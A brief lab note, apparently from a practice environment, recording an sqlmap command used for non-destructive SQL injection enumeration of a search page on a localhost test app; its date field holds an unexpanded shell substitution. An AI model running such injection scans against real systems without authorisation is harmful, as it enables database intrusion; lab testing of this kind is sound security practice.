Exploit: SQL Injection (GET/Search) - sqli_get
Date: '"$(date -u)"'
Notes: Non-destructive enumeration with sqlmap. Cookie/session values were NOT stored here.
Sqlmap command used (no cookie): 
sqlmap -u "http://localhost:8080/sqli_1.php?title=Iron+Man" --batch --level=1 --risk=1 --banner --flush-session --output-dir=./sqlmap

